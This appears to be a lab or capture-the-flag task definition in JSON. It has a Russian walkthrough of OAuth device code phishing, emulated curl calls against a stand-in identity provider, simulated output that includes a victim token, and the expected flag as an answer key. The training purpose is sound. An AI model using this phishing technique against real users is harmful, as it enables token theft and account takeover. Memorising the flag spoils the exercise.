@@ -1,0 +1,42 @@
+{
+  "id": "web-oauth-device-code",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{d3v1c3_c0d3_ph1sh1ng_t0k3n_st34l}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: device code phishing\n\nВход на ТВ через `device code flow`: устройство просит код, человек вводит\nкороткий `user_code` на сайте провайдера и подтверждает. Атакующий запускает\nflow у СЕБЯ, отдаёт жертве свой `user_code` — и получает токены жертвы.\n\n1. Запроси код (как устройство):\n   curl -s https://acmeid.example/device/code -d 'client_id=shop-tv&scope=openid'\n2. Жертва вводит `user_code` (WDJB-MJHT) и подтверждает вход.\n3. Токены уходят устройству, начавшему flow:\n   curl -s 'https://acmeid.example/device/approve?user_code=WDJB-MJHT&device_code=GmRhmhcxhwAzkoEqiMEg'\n4. В ответе — токен жертвы и флаг.\n5. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция acmeid.example device flow)",
+      "cases": [
+        {
+          "match": "device/approve",
+          "example": "-s 'https://acmeid.example/device/approve?user_code=WDJB-MJHT&device_code=GmRhmhcxhwAzkoEqiMEg'",
+          "output": "{\"status\":\"approved\",\"user\":\"victim@corp.example\",\"note\":\"tokens issued to the device that started the flow\",\"access_token\":\"eyJhbGciOiJIUzI1NiJ9.victim.abc\",\"flag\":\"nto{d3v1c3_c0d3_ph1sh1ng_t0k3n_st34l}\"}\n"
+        },
+        {
+          "match": "device/token",
+          "example": "-s 'https://acmeid.example/device/token' -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=GmRhm...&client_id=shop-tv'",
+          "output": "{\"error\":\"authorization_pending\",\"interval\":5}\n"
+        },
+        {
+          "match": "device/code",
+          "example": "-s 'https://acmeid.example/device/code' -d 'client_id=shop-tv&scope=openid'",
+          "output": "{\"device_code\":\"GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS\",\"user_code\":\"WDJB-MJHT\",\"verification_uri\":\"https://acmeid.example/device\",\"expires_in\":1800,\"interval\":5}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются /device/code, /device/token и /device/approve на acmeid.example.\n"
+    }
+  }
+}
